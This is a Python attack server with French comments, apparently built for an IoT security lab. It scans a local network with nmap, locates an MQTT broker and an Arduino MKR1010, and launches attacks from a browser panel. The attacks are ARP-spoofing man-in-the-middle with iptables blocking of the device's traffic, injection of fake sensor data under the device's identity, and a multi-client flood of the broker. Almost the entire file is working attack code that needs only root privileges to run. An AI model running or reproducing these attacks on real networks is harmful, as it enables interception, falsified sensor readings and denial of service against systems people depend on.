#!/usr/bin/env python3
"""
Système d'attaque IoT - Version Améliorée
Intègre l'attaque MITM fonctionnelle + Détection MKR1010
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import subprocess
import threading
import time
import os
import paho.mqtt.client as mqtt
import random
import socket
import re
from datetime import datetime

# ============================================
# CONFIGURATION - RÉSEAU RÉEL
# ============================================
PORT = 8080
INTERFACE = "eth0"  # Interface réseau physique
NETWORK_RANGE = "192.168.10.0/24"  # Ton réseau réel

# États globaux
attack_state = {
    'active': False,
    'type': None,
    'target_ip': None,
    'broker_ip': None,
    'topic': None,
    'interval': 5,
    'stats': {
        'packets_sent': 0,
        'packets_blocked': 0,
        'fake_injected': 0,
        'start_time': None
    },
    'process': None,
    'thread': None
}

scan_state = {
    'scanning': False,
    'devices': [],
    'broker_ip': None,
    'mkr1010_ip': None,
    'network_range': NETWORK_RANGE
}

# ============================================
# MODULE 1 : SCANNER RÉSEAU AMÉLIORÉ
# ============================================
class ImprovedNetworkScanner:
    """Scanner amélioré pour détecter broker + MKR1010"""
    
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.local_ip = None
        self.network_range = NETWORK_RANGE
        self.devices = []
    
    def get_local_ip(self):
        """Récupère l'IP locale de eth0"""
        try:
            result = subprocess.run(
                ["ip", "-4", "addr", "show", self.interface],
                capture_output=True, text=True, check=True
            )
            
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', result.stdout)
            if match:
                self.local_ip = match.group(1)
                print(f"[SCAN] IP locale (eth0): {self.local_ip}")
                return True
            return False
        except Exception as e:
            print(f"[ERROR] Get IP: {e}")
            return False
    
    def scan_network(self):
        """Scanne le réseau avec nmap"""
        try:
            print(f"[SCAN] Scanning {self.network_range}...")
            print("[SCAN] This may take 30-60 seconds...")
            
            result = subprocess.run(
                ["sudo", "nmap", "-sn", "-n", "-T4", self.network_range],
                capture_output=True, text=True, check=True, timeout=90
            )
            
            # Extraire toutes les IPs trouvées
            ips = re.findall(r'Nmap scan report for .*?(\d+\.\d+\.\d+\.\d+)', result.stdout)
            
            # Filtrer notre propre IP
            self.devices = [ip for ip in ips if ip != self.local_ip]
            
            print(f"[SCAN] Found {len(self.devices)} devices:")
            for ip in self.devices:
                print(f"  - {ip}")
            
            return self.devices
        except subprocess.TimeoutExpired:
            print("[ERROR] Scan timeout (network too large)")
            return []
        except Exception as e:
            print(f"[ERROR] Network scan: {e}")
            return []
    
    def identify_mqtt_broker(self, devices):
        """Identifie le broker MQTT (port 1883)"""
        print("[SCAN] Looking for MQTT broker (port 1883)...")
        
        for ip in devices:
            # Test rapide du port 1883
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 1883))
            sock.close()
            
            if result == 0:
                print(f"[SCAN] Port 1883 open on {ip}")
                
                # Tester connexion MQTT réelle
                try:
                    test_client = mqtt.Client(client_id="scan_test", clean_session=True)
                    test_client.connect(ip, 1883, 5)
                    test_client.loop_start()
                    time.sleep(1)
                    test_client.loop_stop()
                    test_client.disconnect()
                    
                    print(f"[SCAN] ✓ MQTT Broker confirmed: {ip}")
                    return ip
                except Exception as e:
                    print(f"[SCAN] {ip} has port 1883 open but MQTT connection failed: {e}")
        
        print("[SCAN] No MQTT broker found")
        return None
    
    def identify_mkr1010(self, devices, broker_ip):
        """Identifie le MKR1010 en testant la connexion MQTT"""
        print("[SCAN] Looking for MKR1010 device...")
        
        if not broker_ip:
            print("[SCAN] Cannot identify MKR1010 without broker")
            return None
        
        # Écouter les messages MQTT pendant quelques secondes
        mkr1010_candidates = []
        detected_device = None
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                client.subscribe("#", qos=0)  # Écouter tous les topics
                print("[SCAN] Listening to MQTT traffic...")
        
        def on_message(client, userdata, msg):
            try:
                payload = json.loads(msg.payload.decode())
                if 'device_id' in payload:
                    device_id = payload.get('device_id')
                    if 'mkr' in device_id.lower():
                        print(f"[SCAN] Found MKR device via MQTT: {device_id}")
                        mkr1010_candidates.append(device_id)
            except:
                pass
        
        try:
            listener = mqtt.Client(client_id="mkr_scanner", clean_session=True)
            listener.on_connect = on_connect
            listener.on_message = on_message
            listener.connect(broker_ip, 1883, 10)
            listener.loop_start()
            
            time.sleep(5)  # Écouter pendant 5 secondes
            
            listener.loop_stop()
            listener.disconnect()
            
            if mkr1010_candidates:
                print(f"[SCAN] ✓ MKR1010 detected via MQTT")
        except Exception as e:
            print(f"[SCAN] Error listening to MQTT: {e}")
        
        # Si pas détecté par MQTT, chercher parmi les IoT devices
        iot_devices = [ip for ip in devices if ip != broker_ip]
        
        if iot_devices:
            # Prendre le premier device IoT comme potentiel MKR1010
            detected_device = iot_devices[0]
            print(f"[SCAN] Assuming {detected_device} is MKR1010 (first IoT device)")
            return detected_device
        
        return None


# ============================================
# MODULE 2 : ATTAQUE MITM (VERSION FONCTIONNELLE)
# ============================================
class NetworkBlocker:
    """
    Bloque le trafic MQTT du MKR1010 vers le broker
    Basé sur le code fonctionnel mqtt_attack_block_and_injection.py
    """
    def __init__(self, target_ip, broker_ip, interface):
        self.target_ip = target_ip
        self.broker_ip = broker_ip
        self.interface = interface
        self.arpspoof_process = None
        self.is_blocking = False
        
    def enable_ip_forward(self):
        """Active le forwarding IP"""
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], 
                         check=True, capture_output=True)
            print("[+] IP forwarding activé")
            return True
        except subprocess.CalledProcessError as e:
            print(f"[-] Erreur activation IP forward: {e}")
            return False
    
    def start_arp_spoofing(self):
        """Démarre l'ARP spoofing"""
        try:
            print(f"[*] Démarrage ARP spoofing...")
            print(f"    Target: {self.target_ip} (MKR1010)")
            print(f"    Gateway: {self.broker_ip} (Broker)")
            
            # Vérifier si arpspoof est installé
            subprocess.run(["which", "arpspoof"], check=True, capture_output=True)
            
            # Démarrer arpspoof
            self.arpspoof_process = subprocess.Popen(
                ["sudo", "arpspoof", "-i", self.interface, "-t", self.target_ip, self.broker_ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(2) 
            print(f"[+] ARP spoofing actif (PID: {self.arpspoof_process.pid})")
            return True
            
        except FileNotFoundError:
            print("[-] arpspoof non trouvé. Installation:")
            print("    sudo apt-get install dsniff")
            return False
        except Exception as e:
            print(f"[-] Erreur ARP spoofing: {e}")
            return False
    
    def block_mqtt_traffic(self):
        """Bloque le trafic MQTT avec iptables"""
        try:
            cmd = [
                "sudo", "iptables", "-I", "FORWARD",
                "-s", self.target_ip,
                "-d", self.broker_ip,
                "-p", "tcp", "--dport", "1883",
                "-j", "DROP"
            ]
            
            subprocess.run(cmd, check=True, capture_output=True)
            print(f"[+] Trafic MQTT bloqué: {self.target_ip} -> {self.broker_ip}:1883")
            self.is_blocking = True
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"[-] Erreur blocage iptables: {e}")
            return False
    
    def start(self):
        """Démarre le blocage complet"""
        print("\n" + "="*60)
        print("BLOCAGE RÉSEAU DU MKR1010")
        print("="*60)
        
        if not self.enable_ip_forward():
            return False
        
        if not self.start_arp_spoofing():
            return False
        
        if not self.block_mqtt_traffic():
            self.stop()
            return False
        
        print("[+] Blocage réseau actif ✓")
        print(f"[+] Le MKR1010 ({self.target_ip}) ne peut plus envoyer de données MQTT\n")
        return True
    
    def stop(self):
        """Arrête le blocage"""
        print("\n[*] Arrêt du blocage réseau...")
        
        # Arrêter arpspoof
        if self.arpspoof_process:
            try:
                self.arpspoof_process.terminate()
                self.arpspoof_process.wait(timeout=5)
                print("[+] ARP spoofing arrêté")
            except:
                try:
                    self.arpspoof_process.kill()
                except:
                    pass
        
        # Retirer la règle iptables
        if self.is_blocking:
            try:
                cmd = [
                    "sudo", "iptables", "-D", "FORWARD",
                    "-s", self.target_ip,
                    "-d", self.broker_ip,
                    "-p", "tcp", "--dport", "1883",
                    "-j", "DROP"
                ]
                subprocess.run(cmd, check=True, capture_output=True)
                print("[+] Règle iptables supprimée")
            except:
                print("[-] Erreur suppression règle iptables")
        
        print("[+] Nettoyage terminé")


class FakeDataInjector:
    """
    Injecte des fausses données MQTT
    Basé sur le code fonctionnel mqtt_attack_block_and_injection.py
    """
    def __init__(self, broker_ip, topic):
        self.broker_ip = broker_ip
        self.topic = topic
        self.client = mqtt.Client(client_id="fake_mkr1010", clean_session=True)
        self.connected = False
        self.message_count = 0
        self.running = False
        
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] Injector connecté au broker")
            self.connected = True
        else:
            print(f"[-] Échec connexion: {rc}")
    
    def connect(self):
        """Connexion au broker"""
        self.client.on_connect = self.on_connect
        
        try:
            self.client.connect(self.broker_ip, 1883, 60)
            self.client.loop_start()
            
            # Attendre la connexion
            timeout = 5
            start = time.time()
            while not self.connected and (time.time() - start) < timeout:
                time.sleep(0.1)
            
            return self.connected
        except Exception as e:
            print(f"[-] Erreur connexion broker: {e}")
            return False
    
    def generate_fake_data(self):
        """Génère des fausses données de capteurs"""
        data = {
            "timestamp": datetime.now().isoformat(),
            "device_id": "mkr1010",
            "temperature": round(random.uniform(18, 28), 2),
            "humidity": round(random.uniform(40, 60), 2),
            "light": random.randint(300, 700),
            "pressure": round(random.uniform(990, 1020), 2),
            "status": "FAKE_DATA",
            "_injected": True
        }
        return data
    
    def inject_continuous(self, interval=5):
        """Injection continue de fausses données"""
        print("\n" + "="*60)
        print("INJECTION DE FAUSSES DONNÉES")
        print("="*60)
        print(f"[*] Topic: {self.topic}")
        print(f"[*] Intervalle: {interval}s\n")
        
        self.running = True
        
        try:
            while self.running and attack_state['active']:
                fake_data = self.generate_fake_data()
                payload = json.dumps(fake_data)
                
                result = self.client.publish(self.topic, payload, qos=1)
                
                if result.rc == 0:
                    self.message_count += 1
                    attack_state['stats']['fake_injected'] += 1
                    attack_state['stats']['packets_sent'] += 1
                    
                    print(f"[{datetime.now().strftime('%H:%M:%S')}] "
                          f"Injection #{self.message_count}: "
                          f"T={fake_data['temperature']}°C, "
                          f"H={fake_data['humidity']}%, "
                          f"L={fake_data['light']}")
                else:
                    print(f"[-] Échec publication")
                
                time.sleep(interval)
                
        except Exception as e:
            print(f"[ERROR] Injection: {e}")
        finally:
            print(f"\n[*] Arrêt de l'injection")
            print(f"[*] Total messages injectés: {self.message_count}")
    
    def stop(self):
        """Arrête l'injection"""
        self.running = False
        time.sleep(1)
        self.client.loop_stop()
        self.client.disconnect()


class CompleteMITMAttack:
    """
    Attaque MITM complète : Blocage + Injection
    Combine NetworkBlocker et FakeDataInjector
    """
    def __init__(self, target_ip, broker_ip, topic, interface="eth0"):
        self.blocker = NetworkBlocker(target_ip, broker_ip, interface)
        self.injector = FakeDataInjector(broker_ip, topic)
        self.running = False
        
    def start(self, interval=5):
        """Lance l'attaque complète"""
        print("""
╔═══════════════════════════════════════════════════════════╗
║  MQTT ATTACK - Block Real + Inject Fake                   ║
╚═══════════════════════════════════════════════════════════╝
        """)
        
        try:
            # Étape 1: Bloquer le MKR1010
            if not self.blocker.start():
                print("[-] Échec du blocage réseau. Abandon.")
                return False
            
            time.sleep(2)
            
            # Étape 2: Connecter l'injector
            print("\n[*] Connexion de l'injector au broker...")
            if not self.injector.connect():
                print("[-] Échec connexion au broker. Abandon.")
                self.blocker.stop()
                return False
            
            time.sleep(1)
            
            # Étape 3: Injection continue
            print("\n[✓] Attaque complète active!")
            print("[✓] Le broker ne reçoit QUE vos fausses données\n")
            
            self.running = True
            
            # Lancer l'injection dans le thread principal
            self.injector.inject_continuous(interval)
            
            return True
            
        except Exception as e:
            print(f"\n[-] Erreur: {e}")
            self.stop()
            return False
    
    def stop(self):
        """Nettoyage et arrêt"""
        print("\n[*] Nettoyage en cours...")
        self.running = False
        self.injector.stop()
        self.blocker.stop()
        print("\n[✓] Attaque MITM terminée proprement")


# ============================================
# MODULE 3 : INJECTION SIMPLE
# ============================================
class InjectionAttack:
    """Injection de fausses données sans blocage"""
    
    def __init__(self, broker_ip, topic, interval=5):
        self.broker_ip = broker_ip
        self.topic = topic
        self.interval = interval
        self.client = mqtt.Client(client_id="injector", clean_session=True)
        self.connected = False
        self.running = False
        
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print("[INJECT] Connected to broker")
            self.connected = True
        else:
            print(f"[ERROR] Injection connection failed: {rc}")
    
    def start(self):
        """Démarre l'injection"""
        print("[INJECT] Starting data injection...")
        
        self.client.on_connect = self.on_connect
        
        try:
            self.client.connect(self.broker_ip, 1883, 60)
            self.client.loop_start()
            
            # Attendre connexion
            timeout = 5
            start = time.time()
            while not self.connected and (time.time() - start) < timeout:
                time.sleep(0.1)
            
            if not self.connected:
                print("[ERROR] Could not connect to broker")
                return
            
            self.running = True
            
            # Boucle d'injection
            while self.running and attack_state['active']:
                fake_data = {
                    "timestamp": datetime.now().isoformat(),
                    "device_id": "fake_device",
                    "temperature": round(random.uniform(15, 35), 2),
                    "humidity": round(random.uniform(30, 70), 2),
                    "light": random.randint(200, 800),
                    "_injected": True
                }
                
                payload = json.dumps(fake_data)
                result = self.client.publish(self.topic, payload, qos=1)
                
                if result.rc == 0:
                    attack_state['stats']['fake_injected'] += 1
                    attack_state['stats']['packets_sent'] += 1
                    print(f"[INJECT] Sent fake data: T={fake_data['temperature']}°C")
                
                time.sleep(self.interval)
                
        except Exception as e:
            print(f"[ERROR] Injection: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Arrête l'injection"""
        print("[INJECT] Stopping injection...")
        self.running = False
        self.client.loop_stop()
        self.client.disconnect()


# ============================================
# MODULE 4 : FLOOD ATTACK
# ============================================
class FloodAttack:
    """Attaque par inondation du broker MQTT"""
    
    def __init__(self, broker_ip, topic, rate=0.1):
        self.broker_ip = broker_ip
        self.topic = topic
        self.rate = rate  # Délai entre messages (secondes)
        self.clients = []
        self.running = False
        
    def start(self):
        """Démarre l'attaque flood"""
        print("[FLOOD] Starting flood attack...")
        print(f"[FLOOD] Target: {self.broker_ip}")
        print(f"[FLOOD] Rate: {1/self.rate:.1f} msg/sec")
        
        self.running = True
        
        # Créer plusieurs clients pour flood
        num_clients = 5
        
        for i in range(num_clients):
            try:
                client = mqtt.Client(client_id=f"flood_{i}", clean_session=True)
                client.connect(self.broker_ip, 1883, 60)
                client.loop_start()
                self.clients.append(client)
                print(f"[FLOOD] Client {i+1}/{num_clients} connected")
            except Exception as e:
                print(f"[ERROR] Flood client {i}: {e}")
        
        time.sleep(1)
        
        # Envoyer des messages en boucle
        try:
            while self.running and attack_state['active']:
                for client in self.clients:
                    payload = json.dumps({
                        "flood": True,
                        "timestamp": time.time(),
                        "data": "X" * 100  # Données de remplissage
                    })
                    
                    client.publish(self.topic, payload, qos=0)
                    attack_state['stats']['packets_sent'] += 1
                
                if attack_state['stats']['packets_sent'] % 100 == 0:
                    print(f"[FLOOD] Sent {attack_state['stats']['packets_sent']} packets")
                
                time.sleep(self.rate)
                
        except Exception as e:
            print(f"[ERROR] Flood: {e}")
        finally:
            self.stop()
    
    def stop(self):
        """Arrête le flood"""
        print("[FLOOD] Stopping flood attack...")
        self.running = False
        
        for client in self.clients:
            try:
                client.loop_stop()
                client.disconnect()
            except:
                pass
        
        self.clients = []
        print("[FLOOD] Flood attack stopped")


# ============================================
# MODULE 5 : DEAUTH ATTACK (WiFi uniquement)
# ============================================
class DeauthAttack:
    """Attaque de déauthentification WiFi (non applicable sur Ethernet)"""
    
    def __init__(self, target_ip, interface):
        self.target_ip = target_ip
        self.interface = interface
    
    def start(self):
        """Cette attaque ne fonctionne que sur WiFi"""
        print("[DEAUTH] Deauth attack is only available on WiFi interfaces")
        print(f"[DEAUTH] Current interface: {self.interface} (Ethernet)")
        print("[DEAUTH] This attack cannot be performed on wired networks")
        
        attack_state['active'] = False
        return False
    
    def stop(self):
        pass


# ============================================
# API HTTP HANDLER
# ============================================
class AttackAPIHandler(BaseHTTPRequestHandler):
    """Gestionnaire des requêtes API"""
    
    def send_json_response(self, data, status=200):
        """Envoie une réponse JSON"""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def do_OPTIONS(self):
        """Gestion CORS"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_GET(self):
        """Routes GET"""
        if self.path == '/':
            self.serve_html()
        elif self.path == '/api/scan':
            response = self.do_scan()
            self.send_json_response(response)
        elif self.path == '/api/status':
            response = {
                'active': attack_state['active'],
                'type': attack_state['type'],
                'stats': attack_state['stats'],
                'target': attack_state['target_ip'],
                'broker': attack_state['broker_ip']
            }
            self.send_json_response(response)
        elif self.path == '/api/stats':
            response = {
                'success': True,
                'stats': attack_state['stats']
            }
            self.send_json_response(response)
        else:
            self.send_error(404)
    
    def do_POST(self):
        """Routes POST"""
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body.decode()) if body else {}
        except:
            data = {}
        
        if self.path == '/api/attack/start':
            response = self.start_attack(data)
            self.send_json_response(response)
        elif self.path == '/api/attack/stop':
            response = self.stop_attack()
            self.send_json_response(response)
        else:
            self.send_error(404)
    
    def serve_html(self):
        """Sert le fichier HTML"""
        html_path = 'attack_panel_fixed.html'
        
        if os.path.exists(html_path):
            with open(html_path, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404)
    
    def do_scan(self):
        """Scanne le réseau réel"""
        if scan_state['scanning']:
            return {'success': False, 'error': 'Scan already in progress'}
        
        scan_state['scanning'] = True
        
        try:
            scanner = ImprovedNetworkScanner(INTERFACE)
            
            if not scanner.get_local_ip():
                scan_state['scanning'] = False
                return {'success': False, 'error': 'Failed to detect local IP'}
            
            devices = scanner.scan_network()
            
            if not devices:
                scan_state['scanning'] = False
                return {'success': False, 'error': 'No devices found on network'}
            
            # Identifier le broker
            broker_ip = scanner.identify_mqtt_broker(devices)
            
            # Identifier le MKR1010
            mkr1010_ip = scanner.identify_mkr1010(devices, broker_ip)
            
            # Identifier les autres devices IoT
            other_devices = [ip for ip in devices if ip != broker_ip and ip != mkr1010_ip]
            
            # Mettre à jour l'état global
            scan_state['broker_ip'] = broker_ip
            scan_state['mkr1010_ip'] = mkr1010_ip
            scan_state['devices'] = []
            
            # Ajouter le broker
            if broker_ip:
                scan_state['devices'].append({
                    'name': 'MQTT Broker',
                    'ip': broker_ip,
                    'status': 'online',
                    'type': 'broker'
                })
            
            # Ajouter le MKR1010
            if mkr1010_ip:
                scan_state['devices'].append({
                    'name': 'MKR1010 Device',
                    'ip': mkr1010_ip,
                    'status': 'online',
                    'type': 'iot'
                })
            
            # Ajouter les autres devices
            for ip in other_devices:
                scan_state['devices'].append({
                    'name': f'IoT Device',
                    'ip': ip,
                    'status': 'online',
                    'type': 'iot'
                })
            
            scan_state['scanning'] = False
            
            return {
                'success': True,
                'broker': broker_ip,
                'mkr1010': mkr1010_ip,
                'devices': scan_state['devices'],
                'network': scanner.network_range
            }
            
        except Exception as e:
            scan_state['scanning'] = False
            return {'success': False, 'error': str(e)}
    
    def start_attack(self, config):
        """Démarre une attaque"""
        if attack_state['active']:
            return {'success': False, 'error': 'Attack already running'}
        
        attack_type = config.get('attack_type')
        target = config.get('target')
        topic = config.get('topic', 'iot/mkr1010/sensors')
        interval = int(config.get('interval', 5))
        broker = scan_state['broker_ip']
        
        if not broker:
            return {'success': False, 'error': 'No broker found. Run scan first.'}
        
        # Extraire l'IP
        if '(' in target:
            target_ip = target.split('(')[1].split(')')[0]
        else:
            target_ip = target
        
        # Réinitialiser les stats
        attack_state['stats'] = {
            'packets_sent': 0,
            'packets_blocked': 0,
            'fake_injected': 0,
            'start_time': time.time()
        }
        
        # Mettre à jour l'état
        attack_state['active'] = True
        attack_state['type'] = attack_type
        attack_state['target_ip'] = target_ip
        attack_state['broker_ip'] = broker
        attack_state['topic'] = topic
        attack_state['interval'] = interval
        
        # Lancer l'attaque dans un thread
        def run_attack():
            try:
                if attack_type == 'mitm':
                    # Utiliser la version fonctionnelle de l'attaque MITM
                    attack = CompleteMITMAttack(target_ip, broker, topic, INTERFACE)
                    attack_state['process'] = attack
                    attack.start(interval)
                
                elif attack_type == 'inject':
                    attack = InjectionAttack(broker, topic, interval)
                    attack_state['process'] = attack
                    attack.start()
                
                elif attack_type == 'flood':
                    attack = FloodAttack(broker, topic, rate=0.1)
                    attack_state['process'] = attack
                    attack.start()
                
                elif attack_type == 'deauth':
                    attack = DeauthAttack(target_ip, INTERFACE)
                    attack_state['process'] = attack
                    attack.start()
                
            except Exception as e:
                print(f"[ERROR] Attack execution: {e}")
                attack_state['active'] = False
        
        attack_state['thread'] = threading.Thread(target=run_attack, daemon=True)
        attack_state['thread'].start()
        
        return {
            'success': True,
            'message': f'{attack_type.upper()} attack started',
            'target': target_ip,
            'broker': broker,
            'topic': topic
        }
    
    def stop_attack(self):
        """Arrête l'attaque en cours"""
        if not attack_state['active']:
            return {'success': False, 'error': 'No attack running'}
        
        print("\n[API] Stopping attack...")
        attack_state['active'] = False
        
        # Arrêter le processus d'attaque
        if attack_state['process']:
            try:
                attack_state['process'].stop()
            except Exception as e:
                print(f"[ERROR] Stopping attack: {e}")
        
        # Attendre que le thread se termine
        if attack_state['thread']:
            attack_state['thread'].join(timeout=5)
        
        stats_copy = attack_state['stats'].copy()
        
        return {
            'success': True,
            'message': 'Attack stopped',
            'stats': stats_copy
        }
    
    def log_message(self, format, *args):
        """Logging HTTP"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] [HTTP] {format % args}")


# ============================================
# MAIN
# ============================================
def run_server():
    """Lance le serveur API"""
    
    # Vérifier root
    if os.geteuid() != 0:
        print("[-] This server requires root privileges")
        print(f"    Run: sudo python3 {__file__}")
        return
    
    # Afficher la configuration
    print(f"""
╔═══════════════════════════════════════════════════════════╗
║         IoT Security Lab - Attack Server v2.0             ║
║         Enhanced with Working MITM Attack                 ║
╚═══════════════════════════════════════════════════════════╝

[+] Server starting on: http://localhost:{PORT}
[+] Network: {NETWORK_RANGE}
[+] Interface: {INTERFACE} (Ethernet)

[*] Improvements:
    ✓ MKR1010 detection added
    ✓ Working MITM attack integrated (block + inject)
    ✓ Enhanced network scanning
    ✓ Better error handling
    
[*] Supported attacks:
    ✓ MITM Attack (Block Real + Inject Fake) - WORKING!
    ✓ Data Injection (Fake sensor data)
    ✓ Flood Attack (Broker overload)
    ✗ Deauth Attack (WiFi only - not available on eth0)

[*] Open http://localhost:{PORT} in your browser
[*] Press Ctrl+C to stop the server

[*] Ready for attacks...
    """)
    
    server_address = ('', PORT)
    httpd = HTTPServer(server_address, AttackAPIHandler)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[*] Shutting down server...")
        
        # Arrêter toute attaque en cours
        if attack_state['active']:
            print("[*] Stopping active attack...")
            attack_state['active'] = False
            if attack_state['process']:
                try:
                    attack_state['process'].stop()
                except:
                    pass
        
        httpd.shutdown()
        print("[+] Server stopped")
        print("[+] Goodbye!")


if __name__ == '__main__':
    run_server()
